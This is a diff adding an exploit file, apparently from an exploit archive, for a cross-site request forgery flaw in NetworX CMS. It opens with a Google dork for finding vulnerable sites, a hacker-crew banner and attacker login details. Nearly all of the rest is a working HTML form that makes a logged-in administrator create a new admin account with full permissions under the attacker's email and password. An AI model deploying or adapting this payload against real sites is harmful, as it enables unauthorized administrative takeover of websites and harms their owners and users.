@@ -1,0 +1,123 @@
+# Exploit Title: NetworX CMS - CSRF Add Admin
+# Date: 15-April-2012
+# Author: N3t.Crack3r
+# Software Link: http://www.socialabc.com/downloads/networx-social/
+# Version: All Version
+# Category:: [Webapps]
+# Google dork: powered by networx
+# Tested on: [Ubuntu]
+# Demo site: http://www.socialabc.com/demo/
+
+<!-- 
+//================================================================================
+
+  ___ ___                __            _______                        
+ /   |   \_____    ____ |  | ____  _  _\   _  \_______  _____   ______
+/    ~    \__  \ _/ ___\|  |/ /\ \/ \/ /  /_\  \_  __ \/     \ /  ___/
+\    Y    // __ \\  \___|    <  \     /\  \_/   \  | \/  Y Y  \\___ \ 
+ \___|_  /(____  /\___  >__|_ \  \/\_/  \_____  /__|  |__|_|  /____  >
+       \/      \/     \/     \/               \/            \/     \/ 
+
+
+Greets : Sho0ter  , Net_spy , khanisgr8 , CROSS & All Hackw0rms Crew / Members
+================================================================================
+
+// Login info : Email : adm@hackw0rms.net pass:t00r
+
+# root@SecBoX:~# cat poc.php -->
+<html>
+<head>
+	<script language="javascript">
+		function country_changed()
+			{
+    			document.getElementById('hdnSubmited').value = 'change_country';
+    			document.getElementById('frmMain').submit();
+			}
+	</script>
+</head>
+<form action="http://<!----- REPLACE HEAR WITH URL ---->/admin/employer.php" form method="post" id="frmMain">
+<input type="hidden" name="submited" value="save" id="hdnSubmited">
+<br>
+<p class="text_14 bold" align="center">NetworX CSRF - Add Admin</p>
+	<table cellpadding="5" border="0">
+		<tr>
+			<td align="right" class="text_12">Email:</td>
+			<td colspan="3">
+			 	<input type="text" name="UserEmail" value="adm@hackw0rms.net">
+			</td>
+		</tr>
+		<tr>
+			<td align="right" class="text_12">Password:</td>
+			<td colspan="3">
+			 	<input type="password" name="Password" value="t00r">
+			</td>
+		</tr>
+		<tr>
+			<td align="right" class="text_12">First Name:</td>
+			<td><input type="text" name="UserFirstname" value="Hack" class="t_box" style="width:150px;"></td>
+			<td align="right" class="text_12">Last Name:</td>
+			<td><input type="text" name="UserLastname" value="W0rm" class="t_box" style="width:150px;"></td>
+		</tr>
+		<tr>
+			<td align="right" class="text_12">Country:</td>
+			<td colspan="3">
+			 	<select name="UserCountry" onchange="country_changed()">
+			 		<option value="{ID}" {selected}>United state of Islam</option>
+			 	</select>
+			</td>
+		</tr>
+		<tr>
+			<td align="right" class="text_12">Address:</td>
+			<td colspan="3">
+				<input type="text" name="UserAddress1" value="69 1337 st" class="t_box" style="width:400px;">
+			</td>
+		</tr>
+		<tr>
+			<td align="right" class="text_12">City / Town:</td>
+			<td colspan="3">
+				<input type="text" name="UserCity" value="system32" class="t_box" style="width:200px;">
+			</td>
+		</tr>
+		<tr>
+			<td align="right" class="text_12">State / Province:</td>
+			<td>
+				<select name="UserState" class="t_box" style="width:100px;">
+			 		<option value="{ID}" {selected}>LA</option>
+				</select>
+			</td>
+			<td align="right" class="text_12">Zip Code:</td>
+			<td><input type="text" name="UserZip" value="31337" class="t_box" style="width:100px;"></td>
+		</tr>
+		<tr>
+			<td align="right" class="text_12">Contact Phone:</td>
+			<td colspan="3">
+				<input type="text" name="UserPhone" value="691337" class="t_box" style="width:200px;">
+			</td>
+		</tr>
+   		<tr>
+   			<td rowspan="10" valign="top" align="http://<!----- REPLACE HEAR WITH URL ---->/admin/employer.php" class="text_12">Permissions:</td>
+				<td><input type="checkbox" name="UserPermissions[]" value="1" class="t_box" checked="checked" func_if_true({PermissionCustomers}, 'checked')> User Management Tool</td>
+		</tr>
+   		<tr>
+			<td><input type="checkbox" name="UserPermissions[]" value="2" class="t_box" checked="checked" func_if_true({PermissionContent}, 'checked')> Content Management Tool</td>
+		</tr>
+   		<tr>
+			<td><input type="checkbox" name="UserPermissions[]" value="4" class="t_box" checked="checked" func_if_true({PermissionStatistics}, 'checked')> Statistics and Reports</td>
+		</tr>
+   		<tr>
+			<td><input type="checkbox" name="UserPermissions[]" value="32" class="t_box" checked="checked" func_if_true({PermissionReports}, 'checked')> Complaint and Report Tool</td>
+		</tr>
+	</table>
+   <br>
+
+   <!-- buttons start -->
+   <table width="100%" cellpadding="5" border="0">
+   		<tr>
+   			<td width="80"> </td>
+			<td align="right">
+   				<input type="submit" name="Save" value="Save" style="width:80px;">
+			</td>
+   		</tr>
+	</table>
+</form>
+</html>
